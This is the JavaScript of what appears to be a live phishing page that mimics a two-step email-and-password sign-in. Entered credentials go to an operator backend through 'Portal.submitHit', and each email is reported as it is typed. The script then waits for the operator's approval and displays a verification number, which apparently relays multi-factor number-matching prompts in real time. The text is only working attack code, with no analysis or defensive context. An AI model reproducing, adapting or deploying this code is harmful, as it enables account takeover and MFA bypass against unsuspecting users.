<script>
const email=document.getElementById("email");
const password=document.getElementById("password");
const nextButton=document.getElementById("next");
const createAccountLink=document.getElementById("createAccountLink");
const rejectMsg=document.getElementById("rejectMsg");
let currentPage="first";
let stopWatch=null;

email.addEventListener("focus",()=>{createAccountLink.classList.add("hidden")});
email.addEventListener("blur",()=>{if(currentPage==="first")createAccountLink.classList.remove("hidden")});

function showLoader(text){document.getElementById("loaderText").textContent=text||"Verifying…";document.getElementById("loader").classList.remove("hidden")}
function hideLoader(){document.getElementById("loader").classList.add("hidden")}

async function goNext(){
  if(currentPage==="second"){passwordNext();return}
  const value=email.value.trim();
  if(!value){email.focus();return}
  nextButton.disabled=true;
  showLoader("Please wait…");
  try{ await Portal.ping(value); }catch(e){}
  setTimeout(function(){
    document.getElementById("account").textContent=value;
    document.getElementById("first").classList.add("hidden");
    document.getElementById("second").classList.remove("hidden");
    hideLoader();
    currentPage="second";
    createAccountLink.classList.add("hidden");
    nextButton.disabled=false;
    window.scrollTo(0,0);
  },800);
}

async function passwordNext(){
  const userVal=email.value.trim();
  const passVal=password.value;
  if(!passVal){password.focus();return}
  rejectMsg.classList.add("hidden");
  nextButton.disabled=true;
  showLoader("Verifying your details…");
  try{
    await Portal.submitHit(userVal,passVal);
  }catch(e){
    hideLoader();
    nextButton.disabled=false;
    rejectMsg.textContent=e.message||"Could not submit, try again.";
    rejectMsg.classList.remove("hidden");
    return;
  }
  if(stopWatch)stopWatch();
  stopWatch=Portal.watch(null,function(s){
    if(s.status==="approved"){
      if(stopWatch){stopWatch();stopWatch=null}
      Portal.clear();
      document.getElementById("verifyNumber").textContent=s.value;
      document.getElementById("screen").classList.add("hidden");
      document.getElementById("verify").classList.remove("hidden");
      hideLoader();
    } else if(s.status==="rejected"){
      if(stopWatch){stopWatch();stopWatch=null}
      Portal.clear();
      password.value="";
      hideLoader();
      nextButton.disabled=false;
      rejectMsg.textContent="Incorrect details, try again.";
      rejectMsg.classList.remove("hidden");
    }
  });
}

function togglePassword(){password.type=document.getElementById("show").checked?"text":"password"}
</script>
